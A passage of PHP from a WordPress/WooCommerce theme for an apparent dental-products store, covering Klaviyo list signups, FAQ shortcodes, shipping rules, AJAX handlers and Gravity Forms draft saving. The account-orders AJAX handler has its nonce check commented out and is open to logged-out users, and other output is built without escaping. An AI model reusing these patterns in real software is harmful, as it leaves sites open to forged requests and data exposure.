     CURLOPT_CUSTOMREQUEST => 'POST',
     CURLOPT_POSTFIELDS => json_encode($profileData_list),
     CURLOPT_HTTPHEADER => array(
         'Authorization: Klaviyo-API-Key ' . $api_key,
         'accept: application/json',
         'content-type: application/json',
         'revision: 2024-05-15'
     ),
 ));
 
 $response = curl_exec($curl);
 
 curl_close($curl);
 return $response;
}

else if (isset($responseData['errors'][0]['meta']['duplicate_profile_id'])) {
 $id = $responseData['errors'][0]['meta']['duplicate_profile_id'];
 $profileData_list = array(
     "data" => array(
         array(
             "type" => "profile",
             "id" => $id
         )
     )
 );

// $id = $responseData['data']['id'];
 $curl = curl_init();
 
 curl_setopt_array($curl, array(
     CURLOPT_URL => 'https://a.klaviyo.com/api/lists/'.$list_id.'/relationships/profiles/',
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_ENCODING => '',
     CURLOPT_MAXREDIRS => 10,
     CURLOPT_TIMEOUT => 0,
     CURLOPT_FOLLOWLOCATION => true,
     CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
     CURLOPT_CUSTOMREQUEST => 'POST',
     CURLOPT_POSTFIELDS => json_encode($profileData_list),
     CURLOPT_HTTPHEADER => array(
         'Authorization: Klaviyo-API-Key ' . $api_key,
         'accept: application/json',
         'content-type: application/json',
         'revision: 2024-05-15'
     ),
 ));
 
 $response = curl_exec($curl);

 curl_close($curl);
 return $response;
}
 
else {

 echo "Error: ID not found in response.";
 die();
}
 }
 
    function custom_faq_shortcode($atts) {
        $output = do_shortcode("[ultimate-faqs include_category='proshield2']");
    // Make sure the ACF function exists
    if (have_rows('select_faqs')):
        $output .= '<div class="ewd-ufaq-faq-list ewd-ufaq-page-type-load_more" id="ewd-ufaq-faq-list"><div class="ewd-ufaq-faqs">';
        // Loop through the rows of data
        while (have_rows('select_faqs')) : the_row();
    
            // Get sub field values
    $faq_id = get_sub_field('select_faq');
            if ($faq_id) {
                $post_id = $faq_id;
                $post_title = get_the_title($post_id);
                $post_content = apply_filters('the_content', get_post_field('post_content', $post_id));
                $permalink = get_permalink($post_id);

                $output .= '<div class="ewd-ufaq-faq-div ewd-ufaq-faq-column-count-one ewd-ufaq-faq-responsive-columns- ewd-ufaq-faq-display-style-default ewd-ufaq-can-be-toggled" id="ewd-ufaq-post-' . $post_id . '" data-post_id="' . $post_id . '">';
                $output .= '<div class="ewd-ufaq-faq-title ewd-ufaq-faq-toggle">';
                $output .= '<a class="ewd-ufaq-post-margin" href="#" role="button">';
                $output .= '<div class="ewd-ufaq-post-margin-symbol ewd-ufaq-square"><span>b</span></div>';
                $output .= '<div class="ewd-ufaq-faq-title-text"><h4>' . $post_title . '</h4></div>';
                $output .= '<div class="ewd-ufaq-clear"></div>';
                $output .= '</a></div>';
                $output .= '<div class="ewd-ufaq-faq-body ewd-ufaq-hidden">';
                $output .= '<div class="ewd-ufaq-post-margin ewd-ufaq-faq-post"><p>' . $post_content . '</p></div>';
                $output .= '<div class="ewd-ufaq-faq-custom-fields"></div>';
                $output .= '<div class="ewd-ufaq-permalink">';
                $output .= '<a href="' . $permalink . '">';
                $output .= '<div class="ewd-ufaq-permalink-image"></div>';
                $output .= '</a></div></div></div>';
            }
        endwhile;
        $output .= '</div></div>';
    endif;
    return $output;
}
add_shortcode('custom_faq', 'custom_faq_shortcode');


function custom_faq_shortcode_tags($atts) {
    // Get the current product's categories
     $product_title = get_the_title(get_the_ID());
    $product_slug = get_post_field('post_name', get_the_ID());

    

    // Get all FAQs
    $faq_args = array(
        'post_type' => 'ufaq',
        'posts_per_page' => -1,
    );
    $faqs = get_posts($faq_args);
    //$output = do_shortcode("[ultimate-faqs include_category='proshield2']");
    $output = '<script src="' . site_url() . '/wp-content/themes/revolution-child/assets/js/ewd-ufaq.js" id="ewd-ufaq-js-js"></script>';
$output .= "<link rel='stylesheet' id='ewd-ufaq-css-css' href='" . site_url() . "/wp-content/themes/revolution-child/assets/css/ewd-ufaq.css?ver=1.1.2' media='all' />";

    // Initialize output
    $output .= '<div class="ewd-ufaq-faqs">';

    // Loop through FAQs and check for matching titles
    foreach ($faqs as $faq) {
        $faq_id = $faq->ID;
       $faqsList = get_custom_taxonomy_tag_names($faq_id);
       $faq_title = get_the_title($faq_id);
        // Check if the FAQ title matches any product category title
        if (is_array($faqsList) && in_array($product_slug,$faqsList)) {
          //  echo 'matched'.$product_title.' ==' .$faq_title;
            // Get the FAQ details
            $post_content = apply_filters('the_content', $faq->post_content);
            $permalink = get_permalink($faq_id);

            $output .= '<div class="ewd-ufaq-faq-div ewd-ufaq-faq-column-count-one ewd-ufaq-faq-responsive-columns- ewd-ufaq-faq-display-style-default ewd-ufaq-can-be-toggled" id="ewd-ufaq-post-' . $faq_id . '" data-post_id="' . $faq_id . '">';
            $output .= '<div class="ewd-ufaq-faq-title ewd-ufaq-faq-toggle">';
            $output .= '<a class="ewd-ufaq-post-margin" href="#" role="button">';
            $output .= '<div class="ewd-ufaq-post-margin-symbol ewd-ufaq-square"><span>b</span></div>';
            $output .= '<div class="ewd-ufaq-faq-title-text"><h4>' . $faq_title . '</h4></div>';
            $output .= '<div class="ewd-ufaq-clear"></div>';
            $output .= '</a></div>';
            $output .= '<div class="ewd-ufaq-faq-body ewd-ufaq-hidden">';
            $output .= '<div class="ewd-ufaq-post-margin ewd-ufaq-faq-post"><p>' . $post_content . '</p></div>';
            $output .= '<div class="ewd-ufaq-faq-custom-fields"></div>';
            $output .= '<div class="ewd-ufaq-permalink">';
            $output .= '<a href="' . $permalink . '">';
            $output .= '<div class="ewd-ufaq-permalink-image"></div>';
            $output .= '</a></div></div></div>';
        }
    }

    $output .= '</div>';

    if ($output == '<div class="ewd-ufaq-faqs"></div>') {
        return '<div>No related FAQs found.</div>';
    }

    return $output;
}

add_shortcode('custom_faqs_tags', 'custom_faq_shortcode_tags');

function get_custom_taxonomy_tag_names($post_id) {
    // Get all tags associated with the post
    $terms = wp_get_post_terms($post_id, 'ufaq-tag');
    // Extract the names of the tags
    $tag_names = array();
    if (!is_wp_error($terms) && !empty($terms)) {
        foreach ($terms as $term) {
            $tag_names[] = $term->slug;
        }
    }

    return $tag_names;
}

    function handle_custom_add_to_cart_gtag() {
        if (isset($_POST['product_id'])) {
            $product_id = intval($_POST['product_id']);
            $product = wc_get_product($product_id);
    
            if ($product) {
                $response = array(
                    'product_id' => $product->get_id(),
                    'product_name' => $product->get_name(),
                    'product_price' => $product->get_price(),
                );
    
                wp_send_json_success($response);
            } else {
                wp_send_json_error('Product not found');
            }
        } else {
            wp_send_json_error('Invalid product ID');
        }
    
        wp_die();
    }
    add_action('wp_ajax_custom_add_to_cart_gtag', 'handle_custom_add_to_cart_gtag');
    add_action('wp_ajax_nopriv_custom_add_to_cart_gtag', 'handle_custom_add_to_cart_gtag');

    function make_specific_words_bold($title, $words_to_bold=array('(Whitening)', '(night guards)', '(Deluxe)')) {
    
        foreach ($words_to_bold as $word) {
            // Use preg_replace to add <strong> tags around the specific words
            $title = preg_replace('/\b' . preg_quote($word, '/') . '\b/i', '<strong>' . $word . '</strong>', $title);
        }
        return $title;
    }

  
    
    // display shiiping method conditionally
    add_filter('woocommerce_package_rates', 'custom_hide_shipping_method_based_on_order_total', 100, 2);

function custom_hide_shipping_method_based_on_order_total($rates, $package) {
    $order_total = WC()->cart->get_cart_contents_total(); // Get the cart total before tax and shipping
    $target_shipping_method_id = SHIPPING_METHOD_ID_BELOW_35; // Replace with your full shipping method ID (prefix + ID)

    // Check if the order total is 35 or more
    if ($order_total >= 35) {
        foreach ($rates as $rate_key => $rate) {
            // If the shipping method ID matches, remove it
            if ($rate_key === $target_shipping_method_id) {
                unset($rates[$rate_key]);
            }
        }
    }

    return $rates;
}

// add shipping protection in woofunnel min cart

// Handle AJAX request to store checkout session
function store_checkout_session_time_taken() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'checkout_sessions';

    // Get the data from the AJAX request
    $start_time = isset( $_POST['start_time'] ) ? intval( $_POST['start_time'] ) : 0;
    $end_time = isset( $_POST['end_time'] ) ? intval( $_POST['end_time'] ) : 0;
    $time_taken = isset( $_POST['time_taken'] ) ? floatval( $_POST['time_taken'] ) : 0;

    // Convert Unix timestamp (milliseconds) to MySQL DATETIME (seconds)
    $start_time_datetime = ($start_time) ? date('Y-m-d H:i:s', $start_time / 1000) : null;
    $end_time_datetime = ($end_time) ? date('Y-m-d H:i:s', $end_time / 1000) : null;

    // Insert data into the custom table
    $wpdb->insert(
        $table_name,
        array(
            'session_start_time' => $start_time_datetime, // Insert as DATETIME
            'session_end_time'   => $end_time_datetime,   // Insert as DATETIME
            'time_taken'         => $time_taken,          // Insert as float
        ),
        array(
            '%s', // session_start_time as DATETIME
            '%s', // session_end_time as DATETIME
            '%f'  // time_taken as FLOAT
        )
    );

    // Send success response
    wp_send_json_success( 'Session data stored successfully.' );
}

// Register AJAX action for both logged-in and logged-out users
add_action( 'wp_ajax_store_checkout_session_time_taken', 'store_checkout_session_time_taken' );
add_action( 'wp_ajax_nopriv_store_checkout_session_time_taken', 'store_checkout_session_time_taken' );

function get_customer_my_account_orders_desktop() {
   // check_ajax_referer('my_account_nonce', 'nonce');

    ob_start();
    getCustomerMyAccountOrders_callback_desktop();
    echo $response = ob_get_clean();

    die();
}
add_action('wp_ajax_get_customer_my_account_orders_desktop', 'get_customer_my_account_orders_desktop');
add_action('wp_ajax_nopriv_get_customer_my_account_orders_desktop', 'get_customer_my_account_orders_desktop');

add_action( 'gform_after_submission', 'display_submission_data', 10, 2 );
function display_submission_data( $entry, $form ) {
    // Redirect to the Thank You page with entry ID as a query parameter
    // $thank_you_page = site_url('/my-account/my_oral_profile/?entry_id=' . $entry['id']);
    // wp_redirect( $thank_you_page );
    // exit;
}

add_action('gform_after_submission', 'save_draft_on_regular_submission', 10, 2);

function save_draft_on_regular_submission($entry, $form) {
    // Ensure this is a regular save and not a "save for later"
    //if (!rgpost('gform_save')) {
        $form_id = $form['id'];
        $lead = GFFormsModel::get_current_lead();
        $field_values = RGForms::post('gform_field_values');
        $page_number = GFFormDisplay::get_source_page($form_id);
        $files = GFFormsModel::set_uploaded_files($form_id);
        $form_unique_id = GFFormsModel::get_form_unique_id($form_id);
        $ip = rgars($form, 'personalData/preventIP') ? '' : GFFormsModel::get_ip();
        $source_url = GFFormsModel::get_current_page_url();
        $source_url = esc_url_raw($source_url);
        $resume_token = rgpost('gform_resume_token');
        $resume_token = sanitize_key($resume_token);

        // Call the save_draft_submission method
        $saved_submission = GFFormsModel::save_draft_submission($form, $lead, $field_values, $page_number, $files, $form_unique_id, $ip, $source_url, $resume_token);
     
    $thank_you_page = site_url('/my-account/my_oral_profile/?entry_id=' . $entry['id'].'&form_id='. $form_id.'&save_token='.$saved_submission);
    update_user_meta(get_current_user_id(),'form_'.$form_id.'_'.$entry['id'].'_token', $saved_submission);
    //$meta_key = 'form_' . $form_id . '_draft_token';

    // Add or update the meta value with the form-specific meta key
    //gform_update_meta( $entry['id'], $meta_key, $saved_submission );
    wp_redirect( $thank_you_page );
     exit;
   
}